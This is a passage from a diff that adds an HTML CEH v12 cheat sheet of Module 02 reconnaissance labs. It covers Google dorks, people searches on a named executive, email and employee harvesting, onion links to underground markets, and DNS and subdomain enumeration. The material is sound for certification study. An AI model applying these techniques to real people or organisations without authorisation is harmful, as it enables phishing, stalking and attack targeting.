@@ -1,0 +1,2654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheet - CEH v12</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav>
+        <h1>[MISSION_CONTROL]</h1>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
+        </div>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">☰</button>
+        <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+            <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+            <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+            <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+            <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+            <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+            <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+            <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
+        </ul>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
+    </nav>
+    <main class="content-body">
+        <div class="window">
+            <div class="module-header">
+                <span>CEH v12 - Quick Reference</span>
+                <h2 class="hero-3d">Cheat Sheet</h2>
+            </div>
+            <p style="color:var(--muted);margin-bottom:24px;">Consolidated command reference across all modules. Click <strong>Copy</strong> on any block. For full lab context, open the module page.</p>
+            <section class="lab-task"><h3>Module 02 — Footprinting &amp; Reconnaissance</h3><div class="section-card">                <p><strong>Gather Information using Advanced Google Hacking Techniques</strong> <span class="tool-tag">Google Advanced Operators</span></p>                <pre><code># Find login pages on target site
+intitle:login site:eccouncil.org
+
+# Search specific file types
+EC-Council filetype:pdf ceh
+
+# Cached version of a site
+cache:www.eccouncil.org
+
+# All query terms in URL
+allinurl: EC-Council career
+
+# Word in URL on a specific site
+inurl: copy site:www.eccouncil.org
+
+# All query terms in title
+allintitle: detect malware
+
+# Anchor text operators
+Anti-virus inanchor:Norton
+allinanchor: best cloud service provider
+
+# Links / related / info / location
+link:www.eccouncil.org
+related:www.eccouncil.org
+info:eccouncil.org
+location: EC-Council                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch Mozilla Firefox, go to https://www.google.com (handle Default Browser pop-up: uncheck always perform check, Not now; notification Okay, Got it; top-right pop-up No thanks). Type &lt;code&gt;intitle:login site:eccouncil.org&lt;/code&gt; and press Enter; restricts results to eccouncil.org pages containing login pages (attackers can subject login pages to credential brute-forcing, injection, other web app attacks). Click back icon to return to Google. Type &lt;code&gt;EC-Council filetype:pdf ceh&lt;/code&gt; and press Enter; search by file extension and keyword; click a result link (e.g., CEH-brochure.pdf) to view the PDF. PDFs/documents may reveal sensitive info about products/services and attack vectors. Other operators: cache (cached version), allinurl (all terms in URL), inurl (word in URL), allintitle (all terms in title), inanchor/allinanchor (anchor text), link (pages pointing to site), related (similar sites), info (info about page), location (location-based). Conduct your own series of queries. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information from Video Search Engines</strong> <span class="tool-tag">YouTube / YouTube Metadata (mattw.io) / Reverse Image Search</span></p>                <pre><code># YouTube search
+https://www.youtube.com  -&gt; search &quot;ec-council&quot; (or target org)
+
+# YouTube Metadata tool
+https://mattw.io/youtube-metadata/
+# Paste copied video link into &quot;Submit a link to a video, playlist, or channel&quot; -&gt; Submit
+
+# Reverse image search (from Thumbnail section -&gt; Click to reverse image search)
+# Other video search engines
+https://www.google.com/videohp
+https://in.video.search.yahoo.com
+
+# Reverse image search tools
+https://tineye.com
+https://images.search.yahoo.com                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch any web browser, go to https://www.youtube.com (here Mozilla Firefox). Search target organization (ec-council); view latest videos. Select any video, right-click title, Copy Link. Open new tab, go to https://mattw.io/youtube-metadata/. Paste link into submit field, click Submit. Observe details in Snippet section (published date/time, channel ID, title, etc.). Scroll for Statistics, Geolocation, Status. Under Thumbnail section click &quot;Click to reverse image search&quot; under any thumbnail; new Google tab shows reverse image search results. Other video search engines and reverse image search tools listed above can gather crucial info. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information from FTP Search Engines</strong> <span class="tool-tag">NAPALM FTP Indexer (searchftps.net) / FreewareWeb FTP File Search</span></p>                <pre><code># Launch browser -&gt; https://www.searchftps.net/
+# In search bar type: microsoft   (or target org) -&gt; click Search
+https://www.freewareweb.com                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch any browser (Mozilla Firefox), go to https://www.searchftps.net/. NAPALM FTP indexer website appears. In search bar type microsoft (or target org), click Search. Results contain critical files and documents related to target. You can also use FreewareWeb FTP File Search (https://www.freewareweb.com). Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information from IoT Search Engines</strong> <span class="tool-tag">Shodan / Censys</span></p>                <pre><code># Shodan
+https://www.shodan.io/  -&gt; search &quot;amazon&quot; (or target org) -&gt; Enter
+# Censys
+https://censys.io                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch any browser (Mozilla Firefox), go to https://www.shodan.io/. Shodan page appears. In search bar type amazon (or target), press Enter. Obtain search results with details of all vulnerable IoT devices related to target in various countries. You can also use Censys (https://censys.io) to gather manufacturer details, geographical location, IP address, hostname, open ports, etc. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Find the Company&#x27;s Domains and Sub-domains using Netcraft</strong> <span class="tool-tag">Netcraft / Sublist3r / Pentest-Tools Find Subdomains</span></p>                <pre><code># Netcraft
+https://www.netcraft.com
+# Menu icon (top-right) -&gt; Resources -&gt; Tools -&gt; Site Report
+# Type target URL: https://www.eccouncil.org -&gt; click Look up
+# In Network section click website link in Domain field to view subdomains
+# Other tools
+https://github.com (Sublist3r)
+https://pentest-tools.com (Find Subdomains)                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch any browser (Mozilla Firefox), go to https://www.netcraft.com. Netcraft page appears (if cookie pop-up, click Accept). Click menu icon top-right, navigate Resources -&gt; Tools -&gt; Site Report. &quot;What&#x27;s that site running?&quot; page appears. Type target website URL (https://www.eccouncil.org) in text field, click Look up. Site report appears with Background, Network, Hosting History, etc. In Network section, click website link (eccouncil.org) in Domain field to view subdomains. Result displays subdomains along with netblock and operating system info. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Personal Information using PeekYou Online People Search Service</strong> <span class="tool-tag">PeekYou / Spokeo / pipl / Intelius / BeenVerified</span></p>                <pre><code># PeekYou
+https://www.peekyou.com
+# First Name: Satya ; Last Name: Nadella ; Location: Washington, DC ; click Search icon
+# Click &quot;View Full Report&quot; for detailed info                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch any browser (Mozilla Firefox), go to https://www.peekyou.com. PeekYou page appears (if cookie pop-up, click I agree). In First Name and Last Name fields type Satya and Nadella. In Location drop-down select Washington, DC. Click Search icon. People search begins and best matches displayed. Result shows public records, background details, email addresses, contact information, address history, etc. Click View Full Report for detailed info. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather an Email List using theHarvester</strong> <span class="tool-tag">theHarvester</span></p>                <pre><code># Launch Parrot Security; login attacker/toor
+sudo su
+# password: toor
+cd
+theHarvester -d microsoft.com -l 200 -b baidu                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security machine, login attacker/toor (ignore Parrot Updater/Question pop-ups). Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor (not visible). Run &lt;code&gt;cd&lt;/code&gt; to root. Run &lt;code&gt;theHarvester -d microsoft.com -l 200 -b baidu&lt;/code&gt; (-d domain/company, -l number results, -b data source). theHarvester extracts details and displays email IDs and hosts from Baidu source. Attackers can use email lists/usernames for social engineering and brute force. Results may differ. You can specify different data sources. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information using Deep and Dark Web Searching</strong> <span class="tool-tag">Tor Browser / DuckDuckGo / Onion Sites</span></p>                <pre><code># Open File Explorer -&gt; C:\Users\Admin\Desktop\Tor Browser -&gt; double-click Start Tor Browser
+# Connect to Tor page -&gt; Connect
+# Minimize Tor; open Mozilla Firefox -&gt; www.google.com -&gt; search &quot;hacker for hire&quot;
+# Switch to Tor Browser -&gt; search &quot;hacker for hire&quot; (uses DuckDuckGo)
+# Onion sites
+http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki
+http://ymvhtqya23wqpez63gyc3ke4svju3mqsby2awnhd3bk2e65izt7baqad.onion
+http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion
+# Tools
+https://metrics.torproject.org (ExoneraTor)
+https://onionlandsearchengine.com                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open File Explorer, navigate C:\Users\Admin\Desktop\Tor Browser, double-click Start Tor Browser. Connect to Tor page; click Connect (or configure bridge/proxy). Tor Browser home page appears (maintains anonymity). Minimize Tor and open Mozilla Firefox; navigate www.google.com; search &quot;hacker for hire&quot; to see irrelevant surface results. Switch to Tor Browser and search same term; relevant underground hacker links appear. Tor uses DuckDuckGo; results may vary. Click any result (e.g., https://www.hackerforhire.net) to view. Explore onion sites (Hidden Wiki, FakeID, Cardshop) and ExoneraTor/OnionLand Search to gather target info. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Determine Target OS Through Passive Footprinting</strong> <span class="tool-tag">Censys / Netcraft / Shodan</span></p>                <pre><code># Censys
+https://search.censys.io/?q=
+# Type target website: www.eccouncil.org -&gt; Enter
+# Click any Hosts IP address to gather OS details
+# Observe OS (e.g., Ubuntu) under Basic Information                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Launch any browser (Mozilla Firefox), go to https://search.censys.io/?q=. In search field type target website (www.eccouncil.org), press Enter. From results click any Hosts IP address to gather OS details. Selected host page appears; under Basic Information observe OS (Ubuntu) plus protocols, software, host keys, etc. Attackers use this to identify potential vulnerabilities/exploits. You can also use Netcraft/Shodan. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Employees&#x27; Information from LinkedIn using theHarvester</strong> <span class="tool-tag">theHarvester (LinkedIn source)</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd
+theHarvester -d eccouncil -l 200 -b linkedin                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security machine. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd&lt;/code&gt;. Run &lt;code&gt;theHarvester -d eccouncil -l 200 -b linkedin&lt;/code&gt; (-d domain/company name eccouncil, -l number results, -b data source LinkedIn). Scroll to view list of employees along with job roles. This info can help attackers perform social engineering/phishing. Results may differ. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Personal Information from Various Social Networking Sites using Sherlock</strong> <span class="tool-tag">Sherlock / Social Searcher / UserRecon</span></p>                <pre><code># In Parrot Security terminal
+sudo su
+# password: toor
+sherlock &quot;satya nadella&quot;                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; In Parrot Security, open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;sherlock &quot;satya nadella&quot;&lt;/code&gt;. You get all URLs related to Satya Nadella; scroll to view all results. Results may differ; ignore errors. Attackers can use gathered URLs to obtain DOB, employment status, organization info, business strategy, potential clients, upcoming project plans. Other tools: Social Searcher, UserRecon. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information About a Target Website using Ping Command Line Utility</strong> <span class="tool-tag">ping (Windows)</span></p>                <pre><code># Windows 11 Command Prompt
+ping www.certifiedhacker.com
+ping www.certifiedhacker.com -f -l 1500
+ping www.certifiedhacker.com -f -l 1300
+ping www.certifiedhacker.com -f -l 1473
+ping www.certifiedhacker.com -f -l 1472
+ping www.certifiedhacker.com -i 3
+ping www.certifiedhacker.com -i 2 -n 1
+ping www.certifiedhacker.com -i 3 -n 1
+ping www.certifiedhacker.com -i 4 -n 1                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open Command Prompt (Search icon, type cmd). Run &lt;code&gt;ping www.certifiedhacker.com&lt;/code&gt; to get IP address and ping stats. Run &lt;code&gt;ping www.certifiedhacker.com -f -l 1500&lt;/code&gt; (DF flag, buffer size 1500) to see &quot;Packet needs to be fragmented but DF set&quot;. Run with 1300. Try 1473 (fragmented) and 1472 (success) to find max frame size (1472). For TTL: &lt;code&gt;ping www.certifiedhacker.com -i 3&lt;/code&gt; shows TTL expired in transit from router. Minimize and open new Command Prompt: &lt;code&gt;ping www.certifiedhacker.com -i 2 -n 1&lt;/code&gt;, then -i 3 -n 1, then -i 4 -n 1, etc. until reply from destination 162.241.216.11; hop count here 19 (may vary). Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information about a Target Website using Photon</strong> <span class="tool-tag">Photon</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd Photon
+python3 photon.py -h
+python3 photon.py -u http://www.certifiedhacker.com
+ls
+python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd Photon&lt;/code&gt;. Run &lt;code&gt;python3 photon.py -h&lt;/code&gt; to view options. Run &lt;code&gt;python3 photon.py -u http://www.certifiedhacker.com&lt;/code&gt; to crawl target for internal/external/scripts URLs; results saved in www.certifiedhacker.com dir under Photon. Run &lt;code&gt;ls&lt;/code&gt; to see directory. Open Places -&gt; Home Folder -&gt; Photon -&gt; www.certifiedhacker.com; view external.txt, internal.txt, scripts.txt in Pluma. Run &lt;code&gt;python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback&lt;/code&gt; (-l level 3, -t 200 threads, --wayback uses archive.org). Further explore cloning, secret keys, cookies, regex strings. Attackers can perform brute-force, DoS, injection, phishing, social engineering. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information About a Target Website using Central Ops</strong> <span class="tool-tag">CentralOps (centralops.net)</span></p>                <pre><code># Windows 11 browser
+https://centralops.net
+# enter domain or IP: www.certifiedhacker.com -&gt; go
+# View Address lookup, Domain Whois, Network Whois, DNS records                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open any browser (Mozilla Firefox), go to https://centralops.net. Central Ops website appears. Type target website URL (www.certifiedhacker.com) in enter a domain or IP address field, click go. Search result shows Address lookup, Domain Whois record. Scroll down for Network Whois record and DNS records. Attackers can use this info for injection and other web app attacks. Other tools: Website Informer, Burp Suite, Zaproxy. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Extract a Company&#x27;s Data using Web Data Extractor</strong> <span class="tool-tag">Web Data Extractor Pro</span></p>                <pre><code># Windows 11
+E:\CEH-Tools\CEHv12 Module 02 Footprinting and Reconnaissance\Web Spiders\Web Data Extractor\wdepro.exe
+# Install Web Data Extractor Pro
+# Search &quot;web data extractor&quot; -&gt; Open
+# New session -&gt; Start URL: https://www.certifiedhacker.com -&gt; check all options -&gt; Start
+# Results tab -&gt; view Meta Tag / Email / Phone / Fax / Link / Domain tabs                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; In Windows 11, navigate E:\CEH-Tools\...Web Data Extractor and double-click wdepro.exe (Run security warning; UAC Yes). Follow wizard to install, click Finish. Search &quot;web data extractor&quot;, open Web Data Extractor Pro. Main window appears; click new session. Session window: type URL (https://www.certifiedhacker.com) in Start URL field; check all options. Click Start to initiate data extraction. Web Data Extractor collects Session, Meta tags, Emails, Phones, Faxes, Links, Domains. Click Results tab to view collected info. View Meta Tag, Email, Phone, Fax, Link, Domain tabs. Other web spiders: ParseHub, SpiderFoot. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Mirror a Target Website using HTTrack Web Site Copier</strong> <span class="tool-tag">HTTrack Web Site Copier (WinHTTrack)</span></p>                <pre><code># Windows 11
+# Search &quot;winhttrack&quot; -&gt; Open WinHTTrack Website Copier
+# New Project: Name &quot;Test Project&quot;; Base path store copied files; Next
+# Web Addresses (URL): https://www.certifiedhacker.com -&gt; Set options
+# Scan Rules tab -&gt; select file types -&gt; OK
+# Next -&gt; &quot;Please adjust connection parameters...&quot; -&gt; check Disconnect when finished -&gt; Finish
+# After mirroring complete -&gt; Browse Mirrored Website                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; In Windows 11, search &quot;winhttrack&quot;, open WinHTTrack Website Copier. About window appears; click OK, then Next to create New Project. Enter project name &quot;Test Project&quot;; select Base path to store copied files; Next. Enter target URL https://www.certifiedhacker.com in Web Addresses (URL); click Set options. WinHTTrack window: Scan Rules tab, select checkboxes for file types; OK. Click Next. By default radio selected for &quot;Please adjust connection parameters if necessary, then press FINISH&quot;; check Disconnect when finished; click Finish to start mirroring. Progress displayed. Once complete, message &quot;Mirroring operation complete&quot;; click Browse Mirrored Website. If &quot;How do you want to open this file?&quot; pop-up, select browser and OK. Mirrored website launches; URL indicates local storage. Analyze directories, HTML, images, flash, videos, other files; check possible exploits/vulnerabilities. If webpage doesn&#x27;t open, navigate to mirrored directory and open index.html. Close browser, click Finish on WinHTTrack, EXIT. Some websites large and take long. Attackers can use vulnerabilities identified to launch web app attacks. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information About a Target Website using GRecon</strong> <span class="tool-tag">GRecon</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd GRecon
+python3 grecon.py
+# Set Target (site.com): certifiedhacker.com                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd GRecon&lt;/code&gt;. Run &lt;code&gt;python3 grecon.py&lt;/code&gt;. GRecon initializes; in Set Target (site.com) field type certifiedhacker.com and press Enter. GRecon searches available subdomains, sub-subdomains, login pages, directory listings, exposed documents, WordPress entries and pasting sites; displays results (~5 minutes). Attackers can use gathered info to perform web app attacks. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather a Wordlist from the Target Website using CeWL</strong> <span class="tool-tag">CeWL</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd
+cewl -d 2 -m 5 https://www.certifiedhacker.com
+cewl -w wordlist.txt -d 2 -m 5 https://www.certifiedhacker.com
+pluma wordlist.txt
+cewl --help                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;sudo su&lt;/code&gt;, password toor. Run &lt;code&gt;cd&lt;/code&gt;. Run &lt;code&gt;cewl -d 2 -m 5 https://www.certifiedhacker.com&lt;/code&gt; (-d depth 2, -m minimum word length 5) to gather unique wordlist. Run &lt;code&gt;cewl -w wordlist.txt -d 2 -m 5 https://www.certifiedhacker.com&lt;/code&gt; to write output to wordlist.txt (saved in root by default). Run &lt;code&gt;pluma wordlist.txt&lt;/code&gt; to view extracted wordlist. Run &lt;code&gt;cewl --help&lt;/code&gt; to view options. This wordlist can be used for brute-force attacks against previously obtained emails. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information about a Target by Tracing Emails using eMailTrackerPro</strong> <span class="tool-tag">eMailTrackerPro</span></p>                <pre><code># Windows 11
+E:\CEH-Tools\CEHv12 Module 02 Footprinting and Reconnaissance\Email Tracking Tools\eMailTrackerPro\emt.exe
+# Install eMailTrackerPro (default options)
+# Launch; Edition Selection -&gt; OK
+# My Trace Reports icon (View)
+# Trace Headers icon (New Email Trace)
+# Select &quot;Trace an email I have received&quot;
+# Paste email header into &quot;Email headers:&quot; field -&gt; Trace
+# View Map, Email Summary, Table hops, View Report                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Navigate E:\CEH-Tools\...eMailTrackerPro and double-click emt.exe (UAC Yes). Follow wizard (default options) to install; in Completing wizard uncheck Show Readme and click Finish. Main window appears with Edition Selection pop-up; click OK. To trace, click My Trace Reports icon from View section. Click Trace Headers icon from New Email Trace section. Pop-up: select &quot;Trace an email I have received&quot;. Copy email header from suspicious email and paste into Email headers field. To find headers: Gmail: open email, click dots (More) next to Reply, select Show original, copy header. Outlook: double-click email, click ... (More actions), View, view message source, copy header. Paste header, click Trace. My Trace Reports window opens; email location traced on Map (world map). View summary via Email Summary; Table shows hops with IP and suspected locations. Click View Report above Map to view complete trace report in default browser (select Firefox if prompted). Expand sections. Other tools: Infoga, Mailtrack. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Perform Whois Lookup using DomainTools</strong> <span class="tool-tag">DomainTools Whois</span></p>                <pre><code># Windows 11 browser
+http://whois.domaintools.com
+# Enter domain or IP: www.certifiedhacker.com -&gt; Search
+# View registration details, name servers, IP address, location, etc.                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; In Windows 11, open any browser (Mozilla Firefox). Go to http://whois.domaintools.com. Whois Lookup website appears. In &quot;Enter a domain or IP address...&quot; search bar, type www.certifiedhacker.com and click Search. Search result reveals details associated with URL including organizational details such as registration details, name servers, IP address, location, etc. Attackers can use this to create network map, social engineering, obtain internal network details. Other Whois lookup tools: SmartWhois, Batch IP Converter. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather DNS Information using nslookup Command Line Utility and Online Tool</strong> <span class="tool-tag">nslookup / NSLOOKUP (kloth.net)</span></p>                <pre><code># Windows 11 Command Prompt
+nslookup
+set type=a
+www.certifiedhacker.com
+set type=cname
+certifiedhacker.com
+set type=a
+ns1.bluehost.com
+
+# Online tool
+http://www.kloth.net/services/nslookup.php
+# Domain: certifiedhacker.com
+# Query: A (IPv4 address) -&gt; Look it up
+# Query: AAAA (IPv6 address) -&gt; Look it up                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; In Windows 11, launch Command Prompt. Type &lt;code&gt;nslookup&lt;/code&gt; and press Enter; displays default server and address. In interactive mode type &lt;code&gt;set type=a&lt;/code&gt; and press Enter; then type target domain &lt;code&gt;www.certifiedhacker.com&lt;/code&gt; and press Enter; resolves IP address (162.241.216.11). Result non-authoritative if from local/Google DNS. Type &lt;code&gt;set type=cname&lt;/code&gt; and press Enter; type &lt;code&gt;certifiedhacker.com&lt;/code&gt; and press Enter; returns authoritative name server (ns1.bluehost.com) and mail server address. Type &lt;code&gt;set type=a&lt;/code&gt; and press Enter; type &lt;code&gt;ns1.bluehost.com&lt;/code&gt; and press Enter; returns IP address of name server. Attackers may exploit primary name server. For online tool: open browser, go to http://www.kloth.net/services/nslookup.php. In Domain field enter certifiedhacker.com; Query default A (IPv4); click Look it up. Change Query to AAAA (IPv6) and Look it up; perform queries. Other tools: DNSdumpster, DNS Records. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Perform Reverse DNS Lookup using Reverse IP Domain Check and DNSRecon</strong> <span class="tool-tag">yougetsignal Reverse IP Domain Check / DNSRecon</span></p>                <pre><code># Windows 11 browser
+https://www.yougetsignal.com
+# Reverse IP Domain Check -&gt; Remote Address: www.certifiedhacker.com -&gt; Check
+
+# Parrot Security
+cd dnsrecon
+chmod +x ./dnsrecon.py
+./dnsrecon.py -r 162.241.216.0-162.241.216.255                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; In Windows 11, open any browser, go to https://www.yougetsignal.com. Click Reverse IP Domain Check. On page, enter www.certifiedhacker.com in Remote Address field, click Check to find other domains/sites hosted on certifiedhacker.com web server; list displayed. Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;cd dnsrecon&lt;/code&gt;. Run &lt;code&gt;chmod +x ./dnsrecon.py&lt;/code&gt;. Run &lt;code&gt;./dnsrecon.py -r 162.241.216.0-162.241.216.255&lt;/code&gt; (-r range first-last for reverse lookup brute force) to locate DNS PTR records for IPs. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Gather Information of Subdomain and DNS Records using SecurityTrails</strong> <span class="tool-tag">SecurityTrails</span></p>                <pre><code># Windows 11 browser
+https://securitytrails.com/
+# Sign Up For Free -&gt; enter details -&gt; check terms -&gt; Sign up for free
+# Verify email -&gt; Confirm Email Address
+# Dashboard -&gt; Enter a Domain, IP, Keyword or Hostname: certifiedhacker.com -&gt; Enter
+# Tabs: DNS records (A, AAAA, MX, NS, SOA, TXT, CNAME), Historical Data, Subdomains                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open browser, go to https://securitytrails.com/. Click Sign Up For Free top-right. Enter required details, check terms, click Sign up for free. Verification email sent. Open new tab, login email, open mail from SecurityTrails, click Confirm Email Address. After verification redirected to Dashboard. In Enter a Domain, IP, Keyword or Hostname field type certifiedhacker.com and press Enter. DNS records appear (A, AAAA, MX, NS, SOA, TXT, CNAME). Examine Historical Data tab (historical A, AAAA, MX, NS, SOA, TXT). Switch to Subdomains tab for all subdomains. DNS records provide locations/types of servers attackers can use for web app attacks. Other tools: DNSChecker, DNSdumpster. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Locate the Network Range</strong> <span class="tool-tag">ARIN Whois</span></p>                <pre><code># Windows 11 browser
+https://www.arin.net/about/welcome/region
+# search IP: 162.241.216.11 -&gt; Search
+# View network range, network type, registration info                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open any browser, go to https://www.arin.net/about/welcome/region (if secure DNS notification appears, click Disable). ARIN website appears. In search bar enter IP address of target organization (162.241.216.11), click Search. Results show network range along with network type, registration info, etc. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Perform Network Tracerouting in Windows and Linux Machines</strong> <span class="tool-tag">tracert / traceroute</span></p>                <pre><code># Windows 11 Command Prompt
+tracert www.certifiedhacker.com
+tracert /?
+tracert -h 5 www.certifiedhacker.com
+
+# Parrot Security terminal
+traceroute www.certifiedhacker.com                &lt;p&gt;&lt;strong&gt;Key procedural steps / narrative:&lt;/strong&gt; Switch to Windows 11. Open Command Prompt. Run &lt;code&gt;tracert www.certifiedhacker.com&lt;/code&gt; to view hops packets made before reaching destination. Run &lt;code&gt;tracert /?&lt;/code&gt; to show options. Run &lt;code&gt;tracert -h 5 www.certifiedhacker.com&lt;/code&gt; to perform trace with max 5 hops. Close command prompt. Switch to Parrot Security. Open MATE Terminal. Run &lt;code&gt;traceroute www.certifiedhacker.com&lt;/code&gt; to view hops (direct hop may appear in simple network; screenshots may vary). Other traceroute tools: VisualRoute, Traceroute NG. Close all open windows and document all acquired information.&lt;/p&gt;</code></pre>                <p><strong>Footprinting a Target using Recon-ng</strong> <span class="tool-tag">Recon-ng</span></p>                <pre><code># Switch to Parrot Security
+sudo su
+# password: toor
+cd
+recon-ng
+help
+marketplace install all
+modules search
+workspaces create CEH
+workspaces list
+db insert domains
+# domain (TEXT): certifiedhacker.com
+# notes (TEXT): (Enter)
+show domains
+modules load brute
+modules load recon/domains-hosts/brute_hosts
+run
+modules load reverse_resolve
+modules load recon/hosts-hosts/reverse_resolve
+run
+show hosts
+back
+modules load reporting
+modules load reporting/html
+options set FILENAME /home/attacker/Desktop/results.html
+options set CREATOR Jason
+options set CUSTOMER Certifiedhacker Networks
+run# Recon-ng personnel info
+workspaces create reconnaissance
+modules load recon/domains-contacts/whois_pocs
+info
+options set SOURCE facebook.com
+run
+
+# Recon-ng subdomains/IPs
+modules load recon/domains-hosts/hackertarget
+options set SOURCE certifiedhacker.com
